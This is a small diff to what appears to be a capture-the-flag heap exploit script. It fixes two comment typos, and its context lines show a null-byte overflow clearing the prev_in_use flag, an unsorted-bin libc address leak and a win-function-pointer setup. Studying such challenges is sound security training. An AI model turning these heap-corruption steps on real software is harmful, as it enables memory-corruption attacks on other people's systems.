@@ -137,7 +137,7 @@ modify_jar(jar_0, flat({
 jar_1 = add_jar("one")
 jar_2 = add_jar("two")
 
-# Overwrite prve_size_field, use null byte overflow to clear the prev_in_use flag of jar 2
+# Overwrite prev_size_field, use null byte overflow to clear the prev_in_use flag of jar 2
 modify_jar(jar_1, flat({
     0xf0: fake_chunk_size
 }))
@@ -157,7 +157,7 @@ remove_jar(jar_1)
 # bin
 remove_jar(jar_2)
 
-# Re allocate jar 1. This is the chunk that we will end up reading the address of the unsorted bin (and therefore lics) from
+# Re allocate jar 1. This is the chunk that we will end up reading the address of the unsorted bin (and therefore libcs) from
 libc_jar = add_jar("libc")
 
 # The win function pointer gets passed a pointer to the jar's contents. We add a jar with that string, so that way when we
